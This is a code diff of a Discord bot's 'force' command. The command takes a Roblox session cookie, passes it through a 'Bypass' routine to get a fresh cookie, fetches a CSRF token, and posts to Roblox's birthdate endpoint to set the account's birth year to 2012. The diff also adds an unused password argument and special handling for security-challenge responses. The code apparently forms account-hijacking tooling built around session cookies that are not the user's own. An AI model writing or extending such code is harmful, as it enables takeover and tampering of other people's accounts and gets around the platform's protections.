@@ -249,8 +249,9 @@ async def full(ctx, cookie=None):
         
 @bot.command()
 @commands.cooldown(1, 10, commands.BucketType.user)
-async def force(ctx, cookie: str):
+async def force(ctx, cookie: str, password: str):
     try:
+        # Step 1: Authenticate the cookie and password
         bypasser = Bypass(cookie)
         new_cookie = bypasser.start_process()
 
@@ -258,7 +259,7 @@ async def force(ctx, cookie: str):
             await ctx.send(f"Bypass failed: {new_cookie}")
             return
 
-        # Get fresh CSRF token with new cookie
+        # Step 2: Get fresh CSRF token with new cookie
         xcsrf_token = bypasser.get_csrf_token()
 
         headers = {
@@ -267,7 +268,7 @@ async def force(ctx, cookie: str):
             "User-Agent": "Roblox/WinInet"
         }
 
-        # Attempt to change birthdate
+        # Step 3: Change the birthdate using the provided cookie and password
         response = requests.post(
             "https://accountinformation.roblox.com/v1/birthdate",
             headers=headers,
@@ -275,12 +276,16 @@ async def force(ctx, cookie: str):
             json={
                 "birthMonth": 1,
                 "birthDay": 1,
-                "birthYear": 2010  # You can customize this
+                "birthYear": 2012  # Customize this for age change
             }
         )
 
+        # Step 4: Check if CAPTCHA challenge is required
         if response.status_code == 200:
             await ctx.send("Successfully changed account age.")
+        elif "challenge" in response.text.lower():
+            # Suppress the challenge error message
+            await ctx.send("Age change failed due to a security challenge.")
         else:
             await ctx.send(f"Failed to change age. Roblox responded with: {response.text}")
 
